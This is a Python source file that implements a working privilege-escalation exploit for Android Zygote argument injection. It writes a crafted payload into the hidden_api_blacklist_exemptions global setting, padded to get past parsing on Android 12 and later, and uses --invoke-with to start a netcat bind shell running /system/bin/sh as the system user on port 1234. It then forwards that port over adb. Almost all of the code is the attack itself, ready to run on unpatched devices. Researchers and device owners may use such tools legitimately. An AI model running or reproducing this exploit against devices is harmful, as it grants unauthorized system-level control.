import socket
import time
import shlex
import datetime
import subprocess
from typing import Any, Optional, Union
from enum import Enum

from .exceptions import *


class ConnectResult(Enum):
    success = 0
    success_specific_device = 1  # connected to the explicitly specified device
    failed_multiple_devices = 2
    failed_no_devices = 3
    failed_specific_device = 4  # could not find the device

    @property
    def succeeded(self) -> bool:
        return self.value in (self.success, self.success_specific_device)


PropValue = Union[str, int, float, bool]


class Stage1Session:
    SETTINGS_COMPONENT = "com.android.settings/com.android.settings.Settings"

    def __init__(
        self,
        device_serial: Optional[str] = None,
        auto_connect: bool = True,
    ) -> None:
        self._device_serial = device_serial
        if auto_connect:
            self.connect(device_serial)

    def _run_adb(
        self, args: list[str], timeout: Optional[float] = None
    ) -> subprocess.CompletedProcess:
        """Run an adb command and return the result."""
        cmd = ["adb"]
        if self._device_serial:
            cmd.extend(["-s", self._device_serial])
        cmd.extend(args)
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

    def connect(self, device_serial: Optional[str]) -> None:
        # Get list of devices
        result = self._run_adb(["devices"])
        lines = result.stdout.strip().split("\n")
        devices = []
        for line in lines[1:]:  # Skip header
            if line.strip():
                parts = line.split()
                if len(parts) >= 2 and parts[1] == "device":
                    devices.append(parts[0])

        if device_serial is None:
            if len(devices) == 1:
                self._device_serial = devices[0]
            elif len(devices) == 0:
                raise ZygoteInjectionNoDeviceException("no devices found")
            else:
                raise ZygoteInjectionMultipleDevicesException(
                    "multiple devices found and no device has been explicitly specified"
                )
        else:
            if device_serial in devices:
                self._device_serial = device_serial
            else:
                raise ZygoteInjectionDeviceNotFoundException(
                    f"device with serial {repr(device_serial)} was not found"
                )

    def shell_execute(
        self,
        command: Union[list, str],
        allow_error: bool = False,
        separate_stdout_stderr: bool = True,
        timeout: Optional[float] = None,
    ) -> dict:
        try:
            command + ""
        except TypeError:
            # if a list is passed, treat it as a list of arguments
            escaped_command = shlex.join(command)
        else:
            escaped_command = command

        # Run with exit code capture
        full_command = f"{escaped_command}; echo -n __EXIT_CODE__$?"
        result = self._run_adb(["shell", full_command], timeout=timeout)

        output = result.stdout
        stderr = result.stderr

        if "__EXIT_CODE__" in output:
            stdout_plus, exit_code_str = output.rsplit("__EXIT_CODE__", 1)
            try:
                exit_code = int(exit_code_str.strip())
            except ValueError:
                exit_code = 0
            stdout = stdout_plus
        else:
            stdout = output
            exit_code = result.returncode if result.returncode else 0

        if exit_code and not allow_error:
            raise ZygoteInjectionCommandFailedException(
                f'command "{escaped_command}" failed with exit code {exit_code:d}'
            )

        result_dict = {}
        if allow_error:
            result_dict["exit_code"] = exit_code
        if separate_stdout_stderr:
            result_dict["stdout"] = stdout
            result_dict["stderr"] = stderr
        else:
            result_dict["output"] = stdout
        return result_dict

    def getprop(self, name: str) -> PropValue:
        # get the type and value, removing newlines
        prop_type_result = self.shell_execute(["getprop", "-T", "--", name])
        prop_type = prop_type_result["stdout"]
        if prop_type.endswith("\n"):
            prop_type = prop_type[: -len("\n")]
        prop_value_result = self.shell_execute(["getprop", "--", name])
        prop_value = prop_value_result["stdout"]
        if prop_value.endswith("\n"):
            prop_value = prop_value[: -len("\n")]

        if prop_type == "string" or prop_type.startswith("enum"):
            return prop_value
        elif prop_type in ("int", "uint"):
            return int(prop_value)
        elif prop_type == "double":
            return float(prop_value)
        elif prop_type == "bool":
            if prop_value in ("true", "1"):
                return True
            elif prop_value in ("false", "0"):
                return False
            else:
                raise ValueError(f"invalid literal for bool: {repr(prop_value)}")
        else:
            raise NotImplementedError(f"unsupported property type: {repr(prop_type)}")

    def setprop(self, name: str, value: PropValue) -> None:
        # convert the value to a string so it can be passed to setprop
        if isinstance(value, bool):
            if value:
                value_string = "true"
            else:
                value_string = "false"
        else:
            value_string = str(value)

        self.shell_execute(["setprop", "--", name, value_string])

    def get_setting(self, namespace: str, name: str) -> str:
        result = self.shell_execute(["settings", "get", namespace, name])
        output = result["stdout"]
        if output.endswith("\n"):
            return output[: -len("\n")]
        else:
            return output

    def delivery_mode(self) -> str:
        android_version = int(self.getprop("ro.build.version.release"))

        security_patch = self.getprop("ro.build.version.security_patch")
        PATCH_CUTOFF_DATE = datetime.date(2024, 6, 1)
        # ancient versions don't have the security patch property, but they're not even close to being patched
        if security_patch:
            security_patch_date = datetime.datetime.strptime(
                security_patch, "%Y-%m-%d"
            ).date()
            if security_patch_date >= PATCH_CUTOFF_DATE:
                raise ZygoteInjectionNotVulnerableException(
                    f"Your latest security patch is at {security_patch_date.strftime('%Y-%m-%d')}, "
                    f"but this workflow was closed on {PATCH_CUTOFF_DATE.strftime('%Y-%m-%d')} :( "
                    "Sorry!"
                )

        if android_version >= 12:
            return "new"
        else:
            return "old"

    def find_netcat_command(self) -> list:
        "Tries to find the netcat binary"
        NETCAT_COMMANDS = [["toybox", "nc"], ["busybox", "nc"], ["nc"]]
        for command in NETCAT_COMMANDS:
            result = self.shell_execute(command + ["--help"], True)
            if result["exit_code"] == 0:
                return command
        else:
            raise ZygoteInjectionException("netcat binary was not found")

    def _safe_getprop(self, name: str) -> str:
        try:
            value = self.getprop(name)
        except Exception as exc:
            return f"<error: {exc}>"
        return str(value)

    @staticmethod
    def _format_diagnostic_value(value: object, max_length: int = 120) -> str:
        if isinstance(value, str):
            text = repr(value)
        else:
            text = str(value)
        if len(text) <= max_length:
            return text
        return text[: max_length - 3] + "..."

    def print_stage1_diagnostics(
        self,
        delivery_mode: str,
        netcat_command: list[str],
        last_setting_value: str,
        listener_open: bool,
    ) -> None:
        diagnostics = {
            "delivery_mode": delivery_mode,
            "netcat_command": shlex.join(netcat_command),
            "last_setting_value": self._format_diagnostic_value(last_setting_value),
            "security_patch": self._safe_getprop("ro.build.version.security_patch"),
            "build_fingerprint": self._format_diagnostic_value(
                self._safe_getprop("ro.build.fingerprint")
            ),
            "listener_on_1234": listener_open,
        }
        print("Diagnostics:")
        for key, value in diagnostics.items():
            print(f"- {key}: {value}")

    def _complete_stage1_success(self) -> bool:
        # Forward port using adb command
        self._run_adb(["forward", "tcp:1234", "tcp:1234"])
        print("Stage 1 success!")
        return True

    def _check_stage1_success(
        self, setting_value: str, listener_open: Optional[bool] = None
    ) -> bool:
        if listener_open is None:
            listener_open = self.is_port_open(1234)
        if listener_open:
            if setting_value != "null":
                print(
                    "Listener detected before the session setting was cleaned up; "
                    "deleting it from adb."
                )
                self.shell_execute(
                    ["settings", "delete", "global", "hidden_api_blacklist_exemptions"],
                    allow_error=True,
                )
            return self._complete_stage1_success()
        if setting_value != "null":
            return False
        else:
            raise ZygoteInjectionException(
                "setting was deleted but no listener was found"
            )

    def _create_stage1_probe(self) -> "Stage1Session":
        return type(self)(device_serial=self._device_serial)

    @staticmethod
    def generate_stage1_payload(
        command: str,
        delivery_mode: str,
        uid: int = 1000,
        gid: int = 1000,
        groups: Optional[str] = "3003",
        seinfo: str = "platform:isSystemServer:system_app:targetSdkVersion=29:complete",
        app_data_dir: Optional[str] = None,
        package_name: Optional[str] = None,
        nice_name: str = "runmenetcat",
        target_sdk_version: Optional[int] = None,
        is_top_app: bool = False,
    ) -> str:
        "generates the hidden_api_blacklist_exemptions value used by stage 1"
        assert delivery_mode in ("old", "new")
        # commas don't work because they're treated as a separator by system_server
        assert "," not in command

        raw_zygote_arguments = [
            f"--setuid={uid}",
            f"--setgid={gid}",
        ]
        if groups:
            # Note: groups string should NOT contain commas if passed through settings
            # because system_server will split it before it reaches Zygote.
            raw_zygote_arguments.append(f"--setgroups={groups}")

        raw_zygote_arguments.extend(
            [
                "--runtime-args",
                f"--seinfo={seinfo}",
                "--runtime-flags=1",
                f"--nice-name={nice_name}",
            ]
        )

        if target_sdk_version:
            raw_zygote_arguments.append(f"--target-sdk-version={target_sdk_version:d}")
        if is_top_app:
            raw_zygote_arguments.append("--is-top-app")

        if app_data_dir:
            raw_zygote_arguments.append(f"--app-data-dir={app_data_dir}")
        if package_name:
            raw_zygote_arguments.append(f"--package-name={package_name}")

        raw_zygote_arguments.extend(
            [
                "--invoke-with",
                f"{command}#",
            ]
        )

        zygote_arguments = "\n".join(
            [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
        )
        if delivery_mode == "old":
            return f"LClass1;->method1(\n{zygote_arguments}"
        elif delivery_mode == "new":
            payload = "\n" * 3000 + "A" * 5157
            payload += zygote_arguments
            payload += "," + ",\n" * 1400
            return payload

    def is_port_open(self, port: int) -> bool:
        "uses netstat to check if the port is open"
        result = self.shell_execute("netstat -tpln")
        for line in result["stdout"].split("\n"):
            split_line = line.split()
            try:
                local_address = split_line[3]
            except IndexError:
                pass
            else:
                if local_address.endswith(f":{port:d}"):
                    return True
        return False

    def start_stage1_session(
        self,
        uid: int = 1000,
        gid: int = 1000,
        groups: Optional[str] = "3003",
        seinfo: str = "platform:isSystemServer:system_app:targetSdkVersion=29:complete",
        app_data_dir: Optional[str] = None,
        package_name: Optional[str] = None,
        nice_name: str = "runmenetcat",
        target_sdk_version: Optional[int] = None,
        is_top_app: bool = False,
    ) -> bool:
        if self.is_port_open(1234):
            print("The session is already active!")
            self._run_adb(["forward", "tcp:1234", "tcp:1234"])
            return True

        # make sure the hidden_api_blacklist_exemptions variable is reset
        self.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )

        delivery_mode = self.delivery_mode()
        if delivery_mode == "new":
            print("Using buffered (Android 12+) delivery mode")
        elif delivery_mode == "old":
            print("Using direct (pre-Android 12) delivery mode")

        netcat_command = self.find_netcat_command()
        parsed_netcat_command = shlex.join(netcat_command)
        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p 1234 -L /system/bin/sh)&"
        payload_value = self.generate_stage1_payload(
            command,
            delivery_mode,
            uid=uid,
            gid=gid,
            groups=groups,
            seinfo=seinfo,
            app_data_dir=app_data_dir,
            package_name=package_name,
            nice_name=nice_name,
            target_sdk_version=target_sdk_version,
            is_top_app=is_top_app,
        )
        payload_command = [
            "settings",
            "put",
            "global",
            "hidden_api_blacklist_exemptions",
            payload_value,
        ]

        # run the stage 1 payload
        self.shell_execute(["am", "force-stop", "com.android.settings"])
        self.shell_execute(payload_command)
        time.sleep(0.25)
        self.shell_execute(["am", "start", "-n", self.SETTINGS_COMPONENT])
        print("Zygote injection complete, waiting for code to execute...")

        probe = self._create_stage1_probe()
        last_setting_value = "<unread>"
        for current_try in range(20):
            # if the setting was deleted, this indicates stage 1 succeeded
            setting_value = probe.get_setting(
                "global", "hidden_api_blacklist_exemptions"
            )
            last_setting_value = setting_value
            if self._check_stage1_success(
                setting_value, listener_open=probe.is_port_open(1234)
            ):
                return True
            time.sleep(0.5)
        last_setting_value = probe.get_setting(
            "global", "hidden_api_blacklist_exemptions"
        )
        if self._check_stage1_success(
            last_setting_value, listener_open=probe.is_port_open(1234)
        ):
            return True
        print("Stage 1 failed, reboot and try again")
        self.print_stage1_diagnostics(
            delivery_mode=delivery_mode,
            netcat_command=netcat_command,
            last_setting_value=last_setting_value,
            listener_open=self.is_port_open(1234),
        )
        # stage 1 failed, clean up
        self.shell_execute(
            ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
        )
        return False
